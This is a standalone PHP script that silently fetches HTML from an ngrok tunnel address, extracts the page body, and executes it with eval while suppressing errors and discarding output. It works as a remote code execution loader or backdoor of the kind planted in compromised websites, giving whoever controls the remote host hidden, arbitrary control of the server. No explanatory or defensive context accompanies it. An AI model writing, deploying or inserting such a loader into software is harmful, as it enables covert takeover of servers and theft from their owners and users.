<?php
error_reporting(0);        
ini_set('display_errors', 0);

$url = 'https://desired-gazelle-steadily.ngrok-free.app/body';


$context = stream_context_create([
    'http' => [
        'timeout' => 5
    ],
    'ssl' => [
        'verify_peer'      => true,
        'verify_peer_name' => true
    ]
]);

$html = @file_get_contents($url, false, $context);
if ($html === false || trim($html) === '') {
    return;
}

libxml_use_internal_errors(true);

$dom = new DOMDocument();
if (!@$dom->loadHTML($html, LIBXML_NOERROR | LIBXML_NOWARNING)) {
    libxml_clear_errors();
    return;
}

$bodyNode = $dom->getElementsByTagName('body')->item(0);
if (!$bodyNode) {
    libxml_clear_errors();
    return;
}

$body = '';
foreach ($bodyNode->childNodes as $child) {
    $body .= $dom->saveHTML($child);
}

libxml_clear_errors();

if (trim($body) === '') {
    return;
}

ob_start();
@eval("?>".$body);
ob_end_clean();
